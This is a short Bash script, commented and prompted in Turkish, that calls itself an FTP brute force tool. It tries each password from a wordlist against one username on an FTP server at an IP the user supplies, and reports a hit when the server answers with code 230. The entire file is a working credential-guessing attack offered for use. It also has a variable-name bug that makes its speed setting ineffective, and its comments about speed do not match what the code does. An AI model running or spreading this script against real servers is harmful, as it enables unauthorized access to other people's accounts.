#!/bin/bash

# Renk tanımları
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Selam dostlar, FTP brute force aracıma hoş geldiniz!${NC}"

# Kullanıcıdan bilgileri al
read -p "Lütfen brute forc yapılacak IP adresini gir: " ip
read -p "Hızı nasıl olsun? (fast/normal/ultra) >> " hiz
read -p "Kelime dosyasının yolunu gir >> " word
read -p "Kullanıcı adını gir >> " user

# Hız seçimine göre gecikme ayarı
case "$hız" in
    fast)
        delay=0.05  # 10 kat hızlandırıldı
        echo -e "${YELLOW}Hız: Fast seçildi. 10 kat hızlandırıldı.${NC}"
        ;;
    normal)
        delay=0.1   # Normal hızda 10 kat hızlandırma
        echo -e "${YELLOW}Hız: Normal seçildi. 10 kat hızlandırıldı.${NC}"
        ;;
    ultra)
        delay=0.01  # Ultra hızda çok hızlı denemeler
        echo -e "${YELLOW}Hız: Ultra seçildi. 10 kat hızlandırıldı.${NC}"
        ;;
    *)
        echo -e "${RED}Geçersiz hız seçimi! Varsayılan olarak normal hızda çalışacak.${NC}"
        delay=0.1
        ;;
esac

# Kullanıcı adı ve kelime dosyasının kontrolü
if [[ -z "$user" || ! -f "$word" ]]; then
    echo -e "${RED}Kullanıcı adı veya şifre dosyası bulunamadı! Lütfen tekrar deneyiniz.${NC}"
    exit 1
fi

# Brute force saldırısını başlat
echo -e "${GREEN}Brute force saldırısı başlatılıyor...${NC}"
while read -r password; do
    echo -e "${YELLOW}Deniyorum: $user / $password${NC}"
    
    # FTP bağlantısını kontrol et ve çıktıyı al
    output=$(ftp -n -v $ip <<EOF
open $ip
user $user $password
bye
EOF
)

    # FTP çıktısını kontrol et
    if echo "$output" | grep -q "230"; then
        echo -e "${GREEN}Başarılı giriş! Kullanıcı: $user, Parola: $password${NC}"
        exit 0
    fi
    
    sleep $delay
done < "$word"

echo -e "${RED}Brute force saldırısı tamamlandı. Başarılı giriş bulunamadı.${NC}"
